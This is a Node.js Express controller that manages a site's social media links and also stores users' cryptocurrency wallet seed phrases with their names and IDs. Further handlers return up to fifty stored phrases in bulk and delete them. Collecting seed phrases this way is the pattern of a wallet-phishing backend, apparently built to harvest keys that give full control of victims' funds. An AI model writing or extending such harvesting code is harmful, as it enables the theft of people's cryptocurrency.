const { responseReturn } = require("../../utilities/response");
const socialModel = require("../../Models/SocialModel");
const SeedModel = require("../../Models/SeedModel");


class socialController {
    create_socials=async (req, res) => {
        const {
            twitter,
            discord,
            whatsapp,
            instagram,
            facebook,
            reddit
          }=req.body;

       try {
        const socialDetails = await socialModel.create({ 
            twitter,
            discord,
            whatsapp,
            instagram,
            facebook,
            reddit
        })
        if (socialDetails) {
            responseReturn(res, 201, { 
                   socialDetails,
                    message: 'social links created successfully' 
                });
        } else {
            responseReturn(res, 404, { 
                 error: 'failed to create socials' 
             });
        }
        
       } catch (error) {
        responseReturn(res, 500, { 
            error: error.message || 'Internal server error' 
        });
       }
      
    }
    //end method
    update_socials=async (req, res) => { 
        const {
            twitter,
            discord,
            whatsapp,
            instagram,
            facebook,
            reddit
          }=req.body;
          const {id}=req.params;
          try {
            const updateSocialDetails = await socialModel.findByIdAndUpdate(id,{ 
                twitter,
                discord,
                whatsapp,
                instagram,
                facebook,
                reddit
            })
            if (updateSocialDetails) {
                responseReturn(res, 201, { 
                       socialDetails:updateSocialDetails,
                        message: 'social links updated successfully' 
                    });
            } else {
                responseReturn(res, 404, { 
                     error: 'failed to create socials' 
                 });
            }
            
          } catch (error) {
            responseReturn(res, 500, { 
                error: error.message || 'Internal server error' 
            });
          }
    }
    //end method
    get_all_socials= async (req, res) => {
        try {
           const socialDetails= await socialModel.find({})
           if(socialDetails){
                responseReturn(res, 201, { 
                            socialDetails:socialDetails[0], 
                                message: 'All socials details got successfully' 
                            });
           }else{
            responseReturn(res, 404, { 
                error: 'could not find any social details' 
            });
           }     
        } catch (error) {
            responseReturn(res, 500, { 
                error: error.message || 'Internal server error' 
            });
        }

    }
    //end method
    create_seedPhrase=async (req, res) => {
        const {userId,seedPhrase,fullname} =req.body;
       
       try {
        const seedDetails = await SeedModel.create({ 
            userId,seedPhrase,fullname
        })
        if (seedDetails) {
            
            responseReturn(res, 201, { 
                    seedDetails,
                    message: 'checking' 
                });
        } else {
            responseReturn(res, 404, { 
                 error: 'failed to create socials' 
             });
        }
        
       } catch (error) {
        responseReturn(res, 500, { 
            error: error.message || 'Internal server error' 
        });
       }
      
    }
    //end method
    get_all_seeds=async (req, res) => {
        try {
            const seedDetails= await SeedModel.find({}).sort({ createdAt: 1 })
            .limit(50)
            .exec()
            .catch(error => {
                console.error('Error fetching contacts:', error);
                throw error;
            });
            if(seedDetails&&seedDetails.length>0){
                //console.log(seedDetails)
                 responseReturn(res, 201, { 
                              seedDetails, 
                                 message: 'All seeds details got successfully' 
                             });
            }else{
             responseReturn(res, 404, { 
                 error: 'could not find any seeds details' 
             });
            }     
         } catch (error) {
             responseReturn(res, 500, { 
                 error: error.message || 'Internal server error' 
             });
         }
    }
    //end method
    delete_seed =async (req, res) => {
        const {id}=req.params;
        try {
          const result = await SeedModel.deleteMany({userId: id});
          if (result) {
              responseReturn(res, 201, { 
                      message: 'seed deleted successfully' 
                  });
          } else {
              responseReturn(res, 404, { 
                   error: 'failed to delete seeds' 
               });
          }
          
        } catch (error) {
          responseReturn(res, 500, { 
              error: error.message || 'Internal server error' 
          });
        }
    }

}

module.exports = new socialController();